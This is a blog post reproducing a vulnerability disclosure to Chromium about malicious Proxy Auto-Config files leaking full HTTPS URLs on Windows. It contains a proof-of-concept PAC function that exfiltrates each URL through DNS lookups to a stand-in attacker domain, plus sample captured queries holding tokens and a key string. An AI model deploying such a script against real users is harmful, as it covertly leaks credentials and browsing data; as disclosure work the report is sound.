---
layout: post
title: Chrome - Proxy Auto-Config SSL/TLS Url Disclosure
category: bugreports
---

Malicious Proxy Auto-Config (PAC) files allow for the disclosure of SSL/TLS encrypted HTTPS request URLs (including full paths and query strings) from Chrome.

<!--more-->

*Original bug report can be viewed at [https://bugs.chromium.org/p/chromium/issues/detail?id=593759](https://bugs.chromium.org/p/chromium/issues/detail?id=593759)*

<pre class="bugreport">
Description:        Proxy Auto-Config SSL/TLS Url Disclosure
Versions Affected:  All Chrome versions on Windows
Category:           Information Disclosure
Reporter:           Alex Chapman and Paul Stone of Context Information Security

Summary:
--------
Malicious Proxy Auto-Config (PAC) files allow for the disclosure of SSL/TLS encrypted HTTPS request URLs (including full paths and query strings) from Chrome. The PAC file specifies a Javascript function, FindProxyForURL(url, host), which is called for each URL request in order to determine the required proxy for the connection. This function receives the full URL and hostname for both HTTP and HTTPS requests, which can be leaked by a malicious PAC script. This could expose credentials, tokens, search terms or any other data passed in HTTPS URL query strings to internet based attackers that would otherwise be encrypted. On Windows systems, this issue can be exploited on a default Chrome installation.

It should be noted that this issue was also identified in Android, and has been reported separately to the Android team.

Analysis:
---------
The PAC file is executed in a limited, sandboxed Javascript environment, but some functions are still available (see http://findproxyforurl.com/pac-functions/), most notably dnsResolve. This allows for the full request URL from affected clients to be leaked to an attacker's DNS server or local network hosts via LLMNR.

Since Chrome defaults to using the Windows proxy settings, including configurations picked up from Web Proxy Auto-Discovery Protocol (WPAD) this issue can be exploited by both malicious gateways and attackers based on the local network (via WPAD injection attacks).

All software that implements the PAC specification as written is affected by this issue. We have confirmed this issue in a number of browsers and operating systems. Notably however, Internet Explorer does not leak full URLs, instead passing only the protocol and hostname to the 'url' parameter of FindProxyForURL (e.g. https://www.example.com/, not https://www.example.com/index.html?foo=bar). Therefore a possible fix for this issue is to follow this same behaviour.

Proof of Concept:
-----------------
A PAC script can be crafted, as below, which will perform a DNS lookup based on the host and url parameters passed into the function:

  function FindProxyForURL(url, host){
    if (dnsResolve((url+'.example.com').replace(/[^a-z0-9_-]+/gi,'.')))
      return "DIRECT";
    return "DIRECT";
  }

This will perform DNS lookups with the encoded URLs against the example.com DNS server.

See the following example DNS captures from HTTPS requests:

  https.www.google.co.uk.webhp.sourceid.chrome-instant.ion.1.espv.2.ie.UTF-8.example.com.
  https.consent.google.com.status.continue.https.www.google.co.uk.pc.s.timestamp.1457624486.example.com.
  https.www.google.co.uk.gen_204.atyp.i.ct.cad.vet.10ahUKEwj_iOuturbLAhXlNpoKHc21DBoQsmQIDg.s.ei.ppXhVv-dGuXt6ATN67LQAQ.zx.1457624490326.example.com.
  https.safebrowsing.google.com.safebrowsing.downloads.client.googlechrome.appver.48.0.2564.116.pver.3.0.key.AIzaSyBOti4mM-6x9WDnZIjIeyEU21OpBXqWBgw.ext.0.example.com.
</pre>
